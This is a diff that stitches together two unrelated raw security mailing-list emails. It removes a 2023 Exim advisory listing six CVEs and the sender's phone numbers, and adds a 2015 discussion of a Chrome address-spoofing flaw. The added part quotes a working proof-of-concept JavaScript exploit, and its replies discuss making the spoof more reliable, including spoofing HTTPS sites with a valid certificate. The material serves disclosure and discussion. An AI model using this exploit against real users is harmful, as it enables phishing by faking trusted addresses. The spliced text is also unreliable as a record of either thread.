@@ -1,4 +1,9 @@
-Received: (qmail 26468 invoked by uid 550); 1 Oct 2023 16:49:19 -0000
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["3286" "Friday" "3" "July" "2015" "12:37:23" "+0700" "anidear" "anidear1@gmail.com" "<CAJUayPnQqiOFvW6nDHGXCM0JNVDSOasYJ=JNXWWvb6Yq=+1cZw@mail.gmail.com>" "96" "Re: [oss-security] Re: [FD] Google Chrome Address Spoofing (Request For Comment)" nil nil nil "7" "2015070305:37:23" "[oss-security] Re: [FD] Google Chrome Address Spoofing (Request For Comment)" (number mark "        anidear1@gma Jul  3   96/3286  " thread-indent "\"Re: [oss-security] Re: [FD] Google Chrome Address Spoofing (Request For Comment)\"\n") "<55954b06.8504710a.a940f.fffffb6dSMTPIN_ADDED_MISSING@mx.google.com>" ("<55954b06.8504710a.a940f.fffffb6dSMTPIN_ADDED_MISSING@mx.google.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0001
+X-Mozilla-Status2: 00000000
+Received: (qmail 25962 invoked by uid 550); 3 Jul 2015 05:58:07 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -6,158 +11,129 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-Received: (qmail 26450 invoked from network); 1 Oct 2023 16:49:18 -0000
-DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
-	d=nodmarc.schlittermann.de; s=2020-06-19; h=In-Reply-To:Content-Type:
-	MIME-Version:References:Message-ID:Subject:To:From:Date:Cc:
-	Content-Description:Content-ID:Content-Transfer-Encoding:Resent-Cc:Resent-To;
-	bh=RDP3gUw6hpjmFU2KgcW+J/eu1m/jt8yyEBkyNFyNh/c=; b=fG0UoVJwWHlio83qbh06h7As0W
-	k6WDj+T6umAfHMK/rzvefpP2eEqf2Pud077AsEh0uJwwtabe8J2XYjqWpC3DAUBbzflxG0nFb9uEx
-	EAdvbgPxEvWraaxN7LbjEEgx/P7tcuAPhzZzt1oug8l9036W6lm38wdT5TSweoiTmNAVYxb2D5oU5
-	f9/aYkSR8uYYkYURJHJWfMIGBn57gf8YVjNkLO9ztb0RWXdwdWODoGh9aCt9eot5qYQcOM5C4+43O
-	EeA6cuez0dGjrqTSWxgscJqyn5CQBDNZtvjb3DOGX81AI409RwjvvbpbI47G6SP+UbHb4l1Y+bSYo
-	fxXlb1dw==;
-Date: Sun, 1 Oct 2023 18:49:06 +0200
-From: Heiko Schlittermann <hs@nodmarc.schlittermann.de>
-To: oss-security@lists.openwall.com
-Message-ID: <ZRmjAky/SBs4aCIw@jumper.schlittermann.de>
-Mail-Followup-To: oss-security@lists.openwall.com
-References: <7b2e3fb3afc05aa39864e62b0c87a631b746f5c7.camel@runout.at>
- <ZRb180+B34Wmg1IM@jumper.schlittermann.de>
+Received: (qmail 13776 invoked from network); 3 Jul 2015 05:37:54 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20120113;
+        h=mime-version:sender:in-reply-to:references:from:date:message-id
+         :subject:to:cc:content-type;
+        bh=y01oJe4jtoIbRBS1halLeqOzjg/J+o3BvnHwig8XSO0=;
+        b=wV1RWrIsKAPnI5ynzrKaM7U2qemIAYoZ6zy9Op8fqAfvIWUFbfscAfUsRB+tR4uhYt
+         FDyW2v5YFuAXeJYGpz02FPKf8o1YAkY4NFc+nfFAGx2C7Vu60skryX0B5ImU0dNAyd3B
+         07zFEdlltDw+GhsDAUKXitCQgofEGkMU2yKlZ7qGQFXAobKJ7eN7EAW1rodyl71M50Y6
+         6CS6AAHsJ7D4QAS1d/bf5AqYo4DATAdhY56KKbpoudBg6P9BEkjwrE6W8uxes0Hh2Yxk
+         +PkRhpd6LwVujCpH9WI3CGteWY0jY7yb/vGArdUzcsvkL5/h9aWLhOGGXwJn+WPG08uN
+         5ldQ==
+X-Received: by 10.182.87.69 with SMTP id v5mr30443520obz.37.1435901862698;
+ Thu, 02 Jul 2015 22:37:42 -0700 (PDT)
 MIME-Version: 1.0
-Content-Type: multipart/signed; micalg=pgp-sha512;
-	protocol="application/pgp-signature"; boundary="QTkO3LhuYLnK6yOJ"
-Content-Disposition: inline
-In-Reply-To: <ZRb180+B34Wmg1IM@jumper.schlittermann.de>
-Organization: schlittermann -- internet & unix support
-X-Face: =y#&-VlCH8uT|8#-#JE_^c<:+qPbYxFD`}8`m)xjyA$93tpwm-vKsa(V,0?906(2VIVNQbU
- QzD%zhE+~-AA?\v-v.HY6]ebO4_$vY`l|||Q!EZT5*Xx/>Fj{8E_a.;;#<4S$>&T%n5()2Yt=R5FSC
- y:Na&@T{Rf`kPq^'ffPFA%`mP~>%-LU$d*]]{-%>j={&MsMND.">]H)&#AoSI~(U8Jk;v*;,Pf+l85
- X?H&`
-X-Telegram: @HeikoSchlittermann
-X-Threema: T5RPWMSS
-X-Signal: +49.172.7909055
-X-Phone: +49.172.7909055
-X-SMS: +49.172.7909055
-X-GPG-Fingerprint: E5CA 331D 44AB 8E4C 806F  DBEE 2610 1B62 F693 76CE
-X-GPG-Key-ID: F69376CE
-Subject: Re: [oss-security] Exim4 MTA CVEs assigned from ZDI
+In-Reply-To: <55954b06.8504710a.a940f.fffffb6dSMTPIN_ADDED_MISSING@mx.google.com>
+References: <55954b06.8504710a.a940f.fffffb6dSMTPIN_ADDED_MISSING@mx.google.com>
+X-Google-Sender-Auth: rl2TxD4_GZSfyR9ns7BMuWJVY7s
+Message-ID: <CAJUayPnQqiOFvW6nDHGXCM0JNVDSOasYJ=JNXWWvb6Yq=+1cZw@mail.gmail.com>
+Content-Type: multipart/alternative; boundary=089e013cb8327565ad0519f1f490
+Cc: David Leo <david.leo@deusen.co.uk>, bugtraq@securityfocus.com, 
+	fulldisclosure@seclists.org
+Date: Fri, 3 Jul 2015 12:37:23 +0700
+From: anidear <anidear1@gmail.com>
+Reply-To: oss-security@lists.openwall.com
+Sender: ptantiku@gmail.com
+Subject: Re: [oss-security] Re: [FD] Google Chrome Address Spoofing (Request
+ For Comment)
+To: oss-security@lists.openwall.com
 
---QTkO3LhuYLnK6yOJ
-Content-Type: text/plain; charset=utf-8
-Content-Disposition: inline
-Content-Transfer-Encoding: quoted-printable
+--089e013cb8327565ad0519f1f490
+Content-Type: text/plain; charset=UTF-8
 
-Dear Exim users,
+I played around with the code to see if can change it to avoid using the
+fork bomb. Here's what I came up with
+https://gist.github.com/ptantiku/d37c364cd13bb31a1ee6
+It seems to need at least 500 threads to update the URL at 5ms for this to
+work (tested on Chrome x64 43.0.2357.130, Linux, locally).
+And the first setInterval() can be substituted for setTimeout(...,10) which
+will run only once for waiting the pop-up window to open.
 
-thank you for your patience.  The following tries to provide an abstract
-about the topics that arose during the recent hours.
+Although the browser is not crashed, the window is still unresponsive to
+allow user to interact with it.
+Wondering if there is a way to fix that.
 
-Summary
--------
-Six 0day exploits were filed against Exim.
+Cheers,
+PT
 
-None of these issues is related to transport security (TLS) being
-on or off.
+On Thu, Jul 2, 2015 at 8:33 PM, Mustafa Al-Bassam <mus@musalbas.com> wrote:
 
-* 3 of them are related to SPA/NTLM, and EXTERNAL auth. If you do not use
-  SPA/NTLM, or EXTERNAL authentication, you're not affected.
-  These issues are fixed.
+> That's pretty neat. Played around with this and made a few discoveries.
+>
+> 1. It shows a valid certificate when you spoof HTTPS sites. That's really
+> bad. POC/screenshot: https://github.com/musalbas/address-spoofing-poc
+>
+> 2. The page isn't responsive when using this flaw. That means you can't
+> spoof a login box for example. (I tried.)
+>
+> 3. The success of the exploit seems to depend on if the browser can start
+> loading content.html fast enough. I noticed that the exploit works 100% of
+> the time when used locally. Perhaps a better version of the exploit would
+> somehow preload content.html - for example by opening a window with an URL
+> that starts with javascript: followed by a script to display the content?
+> That, or perhaps reducing the interval time for trying to run next() after
+> the popup is created.
+>
+> I wonder if this works on any other browsers?
+>
+> MustafaOn 30 Jun 2015 7:08 am, David Leo <david.leo@deusen.co.uk> wrote:
+> >
+> > Impact:
+> > The "click to verify" thing is completely broken...
+> > Anyone can be "BBB Accredited Business" etc.
+> > You can make whitehouse.gov display "We love Islamic State" :-)
+> >
+> > Note:
+> > No user interaction on the fake page.
+> >
+> > Code:
+> > ***** index.html
+> > <script>
+> > function next()
+> > {
+> > w.location.replace('http://www.oracle.com/index.html?'+n);n++;
+> > setTimeout("next();",15);
+> > setTimeout("next();",25);
+> > }
+> > function f()
+> > {
+> > w=window.open("content.html","_blank","width=500 height=500");
+> >
+> i=setInterval("try{x=w.location.href;}catch(e){clearInterval(i);n=0;next();}",5);
+> > }
+> > </script>
+> > <a href="#" onclick="f()">Go</a><br>
+> > ***** content.html
+> > <b>This web page is NOT oracle.com</b>
+> > <script>location="http://www.oracle.com/index.html";</script>
+> > ***** It's online
+> > http://www.deusen.co.uk/items/gwhere.6128645971389012/
+> > (The page says "June/16/2015" - it works as we tested today)
+> >
+> > Request For Comment:
+> > We reported this to Google.
+> > They reproduced, and say
+> > It's DoS which doesn't matter.
+> > We think it's very strange,
+> > since the browser does not crash(not DoS),
+> > and the threat is obvious.
+> > What's your opinion?
+> >
+> > Kind Regards,
+> >
+> > PS
+> > We love clever tricks.
+> > We love this:
+> > http://dieyu.org/
+> >
+> >
+> > _______________________________________________
+> > Sent through the Full Disclosure mailing list
+> > https://nmap.org/mailman/listinfo/fulldisclosure
+> > Web Archives & RSS: http://seclists.org/fulldisclosure/
+>
 
-* One issue is related to data received from a proxy-protocol proxy. If
-  you do not use a proxy in front of Exim, you're not affected. If your
-  proxy is trustworthy, you're not affected. We're working on a fix.
-
-* One is related to libspf2. If you do not use the `spf` lookup type
-  or the `spf` ACL condition, you are not affected.
-
-* The last one is related to DNS lookups. If you use a trustworthy
-  resolver (which does validation of the data it receives), you're
-  not affected. We're working on a fix.
-
-Schedule
---------
-Currently we're in contact with the major distros and aim to release
-those fixes that are available as soon as possible. (Aiming Monday, Oct
-2nd.) The below mentioned commits are currently available in a
-protected repo to a restricted set of users only.
-
-More Details
-------------
-
-ZDI-23-1468 | ZDI-CAN-17433 | CVE-2023-42114 | Exim bug 3001
-------------------------------------------------------------
-Subject:    NTLM Challenge Out-Of-Bounds Read
-CVSS Score: 3.7
-Mitigation: Do not use SPA (NTLM) authentication
-Subsystem:  SPA auth
-Fixed:      04107e98d, 4.96.1, 4.97
-
-ZDI-23-1469 | ZDI-CAN-17434 | CVE-2023-42115 | Exim bug 2999
-------------------------------------------------------------
-Subject:    AUTH Out-Of-Bounds Write
-CVSS Score: 9.8
-Mitigation: Do not offer EXTERNAL authentication.
-Subsystem:  EXTERNAL auth
-Fixed:      7bb5bc2c6, 4.96.1, 4.97
-
-ZDI-23-1470 | ZDI-CAN-17515 | CVE-2023-42116 | Exim bug 3000
-------------------------------------------------------------
-Subject:    SMTP Challenge Stack-based Buffer Overflow
-CVSS Score: 8.1
-Mitigation: Do not use SPA (NTLM) authentication
-Subsystem:  SPA auth
-Fixed:      e17b8b0f1, 4.96.1, 4.97
-
-ZDI-23-1471 | ZDI-CAN-17554 | CVE-2023-42117 | Exim Bug 3031
--------------------------------------------------------------
-Subject:    Improper Neutralization of Special Elements
-CVSS Score: 8.1
-Mitigation: Do not use Exim behind an untrusted proxy-protocol proxy
-Subsystem:  proxy protocol (not socks!)
-Fix:        not yet
-
-ZDI-23-1472 | ZDI-CAN-17578 | CVE-2023-42118 | Exim Bug 3032
-------------------------------------------------------------
-Subject:    libspf2 Integer Underflow
-CVSS Score: 7.5
-Mitigation: Do not use the `spf` condition in your ACL
-Subsystem:  spf
-Remark:     It is debatable if this should be filed against
-            libspf2.
-
-ZDI-23-1473 | ZDI-CAN-17643 | CVE-2023-42219 | Exim Bug 3033
-------------------------------------------------------------
-Subject:    dnsdb Out-Of-Bounds Read
-CVSS Score: 3.1
-Mitigation: Use a trustworthy DNS resolver which is able to
-            validate the data according to the DNS record types.
-Subsystem:  dns lookups
-Fix:        not yet
-Remark:     It is still under consideration.
-
-    Best regards from Dresden/Germany
-    Viele Gr=C3=BC=C3=9Fe aus Dresden
-    Heiko Schlittermann
---
- SCHLITTERMANN.de ---------------------------- internet & unix support -
- Heiko Schlittermann, Dipl.-Ing. (TU) - {fon,fax}: +49.351.802998{1,3} -
- gnupg encrypted messages are welcome --------------- key ID: F69376CE -
-
---QTkO3LhuYLnK6yOJ
-Content-Type: application/pgp-signature; name="signature.asc"
-
------BEGIN PGP SIGNATURE-----
-
-iQEzBAABCgAdFiEE0L/WueylaUpvFJ3Or0zGdqa2wUIFAmUZowEACgkQr0zGdqa2
-wULriAf+M0A+BFDuPLiWxh0fT2c68s4dvO4GzSYSC90aZ6vAIAok7xA9ch0PbNEs
-eNwvcaX6jhtoeGZlZbXU9RgGGxYE1a1j8rdeuCvdRt6KkJMk4din+eKwDA7zNe4T
-t425qb0vBHDVkk4gyzKXNhL3AhIzREsINxgZPlYuh6Za2G93MUcMRtHYGYPA/qxV
-gb/mhNMi2upvMnEZYo+28Mnmkx0RSOSo1+uQcSbuQiJMfMTyXAE2TOLxwQJ9Eezk
-X8kCtxhE40DtxO5DSYRbVlvmryPMv3rpbHweND8lBy4g2ZtoQ1iXIJozxax1Oxy6
-kL/xDcHOVjyoJ7d2Z1yXbyk0L+4iQw==
-=E2nT
------END PGP SIGNATURE-----
-
---QTkO3LhuYLnK6yOJ--
+--089e013cb8327565ad0519f1f490--
